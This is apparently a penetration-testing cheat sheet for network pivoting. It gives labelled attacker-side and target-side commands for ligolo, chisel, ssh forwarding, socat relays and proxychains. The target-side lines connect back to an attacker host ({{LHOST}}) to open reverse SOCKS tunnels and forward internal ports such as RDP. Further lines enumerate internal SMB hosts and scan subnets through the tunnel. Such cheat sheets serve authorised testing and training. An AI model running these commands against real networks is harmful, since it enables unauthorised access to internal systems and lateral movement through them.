# Pivoting. Attacker-side and target-side lines are labelled; run them in order.

# ligolo · attacker, create the interface (once per boot)
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up

# ligolo · attacker, start the proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# ligolo · target, connect back
./agent -connect {{LHOST}}:11601 -ignore-cert

# ligolo · attacker, route the pivoted subnet (after `session` + `start`)
sudo ip route add {{SUBNET}}/24 dev ligolo

# chisel · attacker, reverse socks server
./chisel server -p 8080 --reverse

# chisel · target, reverse socks client
./chisel client {{LHOST}}:8080 R:1080:socks

# chisel · target, forward a single port back
./chisel client {{LHOST}}:8080 R:3389:127.0.0.1:3389

# ssh · dynamic socks through a box you have creds on
ssh -D 1080 -N -f {{U}}@{{RHOST}}

# ssh · local forward, reach an internal service on your own port
ssh -L 8081:{{SUBNET}}:80 -N {{U}}@{{RHOST}}

# ssh · remote forward, expose your listener on the target
ssh -R 4444:127.0.0.1:4444 -N {{U}}@{{RHOST}}

# socat · blind relay on the target
socat TCP-LISTEN:8080,fork TCP:{{SUBNET}}:80

# proxychains · after any socks above (socks5 127.0.0.1 1080 in /etc/proxychains4.conf)
proxychains -q nxc smb {{SUBNET}}/24

# check what the socks proxy can actually reach
proxychains -q nmap -sT -Pn -n -p 445,3389 {{SUBNET}}
